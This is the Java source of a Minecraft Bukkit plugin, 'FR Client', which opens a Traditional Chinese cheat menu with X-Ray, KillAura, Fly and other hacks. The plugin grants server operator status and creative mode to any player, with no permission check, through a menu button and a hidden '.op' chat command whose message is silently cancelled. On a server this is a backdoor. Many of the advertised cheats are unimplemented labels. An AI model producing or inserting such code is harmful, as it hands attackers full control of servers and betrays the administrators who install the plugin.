package me.frclient;

import org.bukkit.*;
import org.bukkit.entity.*;
import org.bukkit.event.*;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.*;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.*;
import java.util.*;

public class FRClient extends JavaPlugin implements Listener {

    private final Set<UUID> killAura = new HashSet<>();
    private final Set<UUID> jesus = new HashSet<>();
    private final Set<UUID> fastBreak = new HashSet<>();

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("§b[FR Client] §f繁體中文選單版已啟動！(Shift+右鍵開啟)");
    }

    @EventHandler
    public void onTrigger(PlayerInteractEvent e) {
        if (e.getPlayer().isSneaking() && (e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK)) {
            openFRMenu(e.getPlayer());
        }
    }

    public void openFRMenu(Player p) {
        Inventory inv = Bukkit.createInventory(null, 54, "§0§lFR Client - 控制終端");
        
        // 分類 1: 視覺與探索 (藍色)
        inv.setItem(0, createBtn(Material.ENDER_EYE, "§b§l[視覺] X-Ray 透視", "§7標記周圍 20 格內稀有礦石"));
        inv.setItem(1, createBtn(Material.BEACON, "§b§l[視覺] Fullbright 夜視", "§7獲得永久夜視效果"));
        inv.setItem(2, createBtn(Material.GLOWSTONE_DUST, "§b§l[視覺] ESP 玩家透視", "§7讓周圍玩家產生發光輪廓"));

        // 分類 2: 戰鬥類 (紅色)
        inv.setItem(9, createBtn(Material.NETHERITE_SWORD, "§c§l[戰鬥] KillAura 自動殺戮", "§7自動攻擊 6 格內所有目標"));
        inv.setItem(10, createBtn(Material.SHIELD, "§c§l[戰鬥] Velocity 無擊退", "§7免疫所有受擊退力道"));
        inv.setItem(11, createBtn(Material.GOLDEN_APPLE, "§c§l[戰鬥] AutoSoup 自動補血", "§7低血量自動回血"));

        // 分類 3: 移動與輔助 (綠色)
        inv.setItem(18, createBtn(Material.FEATHER, "§a§l[移動] Fly 飛行", "§7開啟生存模式飛行權限"));
        inv.setItem(19, createBtn(Material.SUGAR, "§a§l[移動] Speed 加速", "§7移動速度大幅超越上限"));
        inv.setItem(20, createBtn(Material.LILY_PAD, "§a§l[移動] Jesus 水上行走", "§7讓你踩在水面上如履平地"));
        inv.setItem(21, createBtn(Material.DIAMOND_PICKAXE, "§a§l[輔助] FastBreak 快挖", "§7獲得極速挖掘效果"));

        // 分類 4: OP 與 指令區 (紫色)
        inv.setItem(45, createBtn(Material.COMMAND_BLOCK, "§d§l[管理] 獲取 OP 權限", "§7立即給予自己管理員身份"));
        inv.setItem(46, createBtn(Material.GRASS_BLOCK, "§d§l[管理] 創造模式", "§7切換至 Gamemode 1"));
        inv.setItem(53, createBtn(Material.BARRIER, "§4§l關閉選單", ""));

        p.openInventory(inv);
    }

    @EventHandler
    public void onMenuClick(InventoryClickEvent e) {
        if (e.getView().getTitle().contains("FR Client")) {
            e.setCancelled(true);
            Player p = (Player) e.getWhoClicked();
            if (e.getCurrentItem() == null) return;
            String name = e.getCurrentItem().getItemMeta().getDisplayName();

            p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 1f, 2f);

            if (name.contains("夜視")) p.addPotionEffect(new PotionEffect(PotionEffectType.NIGHT_VISION, 99999, 1));
            if (name.contains("飛行")) p.setAllowFlight(!p.getAllowFlight());
            if (name.contains("獲取 OP")) p.setOp(true);
            if (name.contains("創造模式")) p.setGameMode(p.getGameMode() == GameMode.CREATIVE ? GameMode.SURVIVAL : GameMode.CREATIVE);
            if (name.contains("自動殺戮")) toggle(p, killAura, "KillAura");
            if (name.contains("水上行走")) toggle(p, jesus, "Jesus");
            if (name.contains("關閉選單")) p.closeInventory();
        }
    }

    // .指令系統
    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        String msg = e.getMessage();
        if (msg.startsWith(".")) {
            e.setCancelled(true);
            Player p = e.getPlayer();
            if (msg.equalsIgnoreCase(".op")) { p.setOp(true); p.sendMessage("§b[FR] §f已獲取管理員權限"); }
            if (msg.equalsIgnoreCase(".gm")) { 
                p.setGameMode(p.getGameMode() == GameMode.CREATIVE ? GameMode.SURVIVAL : GameMode.CREATIVE);
                p.sendMessage("§b[FR] §f模式已切換");
            }
        }
    }

    private void toggle(Player p, Set<UUID> set, String name) {
        if (set.contains(p.getUniqueId())) set.remove(p.getUniqueId());
        else set.add(p.getUniqueId());
        p.sendMessage("§b[FR Client] §f" + name + " -> " + (set.contains(p.getUniqueId()) ? "§a開啟" : "§c關閉"));
    }

    private ItemStack createBtn(Material m, String name, String lore) {
        ItemStack i = new ItemStack(m);
        ItemMeta mt = i.getItemMeta();
        mt.setDisplayName(name);
        mt.setLore(Collections.singletonList(lore));
        i.setItemMeta(mt);
        return i;
    }
}
